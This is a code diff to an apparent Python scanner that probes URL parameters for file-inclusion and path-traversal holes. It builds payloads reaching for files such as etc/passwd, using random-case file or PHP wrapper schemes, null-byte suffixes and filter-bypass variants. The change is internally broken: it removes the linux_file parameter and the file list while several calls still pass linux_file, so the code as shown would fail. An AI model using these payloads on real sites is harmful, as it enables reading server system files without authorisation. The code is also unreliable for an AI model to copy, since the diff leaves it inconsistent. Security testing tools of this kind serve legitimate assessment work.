@@ -475,11 +475,10 @@ def valid_parameter(parm):
  except:
   return True
 
-def path_traversal_link(u,null_byte=False,bypass=False,linux_file=0,target_os="linux",file_wrapper=True,proxy=None,proxies=None,timeout=10,user_agent=None,cookie=None):
+def path_traversal_check(u,php_wrapper="file",null_byte=False,bypass=False,target_os="linux",proxy=None,proxies=None,timeout=10,user_agent=None,cookie=None):
  '''
    this function is for FI vulnerability test using a link
 '''
- linux_files=['{}etc{}passwd','{}proc{}version']
  if proxy:
   proxy={'http':'http://'+proxy,'https':'http://'+proxy}
  if proxies:
@@ -504,8 +503,8 @@ def path_traversal_link(u,null_byte=False,bypass=False,linux_file=0,target_os="l
    l=l.format("./"*random.randint(1,5),"./"*random.randint(1,5))
   else:
    l=l.format("/"*random.randint(1,5),"/"*random.randint(1,5))
-  if file_wrapper==True:
-   l=''.join(random.choice((str.upper, str.lower))(c) for c in "file")+"://"+l
+  if php_wrapper:
+   l=''.join(random.choice((str.upper, str.lower))(c) for c in php_wrapper)+"://"+l
   if null_byte==True:
    l+="%00"
   try:
@@ -516,7 +515,7 @@ def path_traversal_link(u,null_byte=False,bypass=False,linux_file=0,target_os="l
     pass
  return (False,'')
  
-def path_traversal(u,null_byte=False,bypass=False,target_os="linux",file_wrapper=True,proxy=None,proxies=None,timeout=10,user_agent=None,cookie=None): 
+def path_traversal_url(u,null_byte=False,bypass=False,target_os="linux",php_wrapper="file",proxy=None,proxies=None,timeout=10,user_agent=None,cookie=None): 
  res=[]
  if u.split("?")[0][-1]!="/" and '.' not in u.split("?")[0].rsplit('/', 1)[-1]:
     u=u.replace('?','/?')
@@ -536,17 +535,17 @@ def path_traversal(u,null_byte=False,bypass=False,target_os="linux",file_wrapper
    for y in x[3]:
     if valid_parameter(y[1])==True:
      trgt=ur.replace(y[0]+"="+y[1],y[0]+"={}")
-     q=path_traversal_link(trgt,null_byte=null_byte,bypass=bypass,linux_file=0,target_os="linux",file_wrapper=file_wrapper,proxy=proxy,proxies=proxies,timeout=timeout,cookie=cookie,user_agent=user_agent)
+     q=path_traversal_check(trgt,null_byte=null_byte,bypass=bypass,linux_file=0,target_os="linux",php_wrapper=php_wrapper,proxy=proxy,proxies=proxies,timeout=timeout,cookie=cookie,user_agent=user_agent)
      if q[0]==True:
       if q[1] not in res:
         res.append(q[1])
      else:
-      q=path_traversal_link(trgt,null_byte=null_byte,bypass=bypass,linux_file=1,target_os="linux",file_wrapper=file_wrapper,proxy=proxy,proxies=proxies,timeout=timeout,cookie=cookie,user_agent=user_agent)
+      q=path_traversal_check(trgt,null_byte=null_byte,bypass=bypass,linux_file=1,target_os="linux",php_wrapper=php_wrapper,proxy=proxy,proxies=proxies,timeout=timeout,cookie=cookie,user_agent=user_agent)
       if q[0]==True:
         if q[1] not in res:
          res.append(q[1])
       else:
-        q=path_traversal_link(trgt,null_byte=null_byte,bypass=bypass,file_wrapper=file_wrapper,proxy=proxy,proxies=proxies,timeout=timeout,cookie=cookie,user_agent=user_agent,target_os="windows")
+        q=path_traversal_check(trgt,null_byte=null_byte,bypass=bypass,php_wrapper=php_wrapper,proxy=proxy,proxies=proxies,timeout=timeout,cookie=cookie,user_agent=user_agent,target_os="windows")
         if q[0]==True:
          if q[1] not in res:
           res.append(q[1])
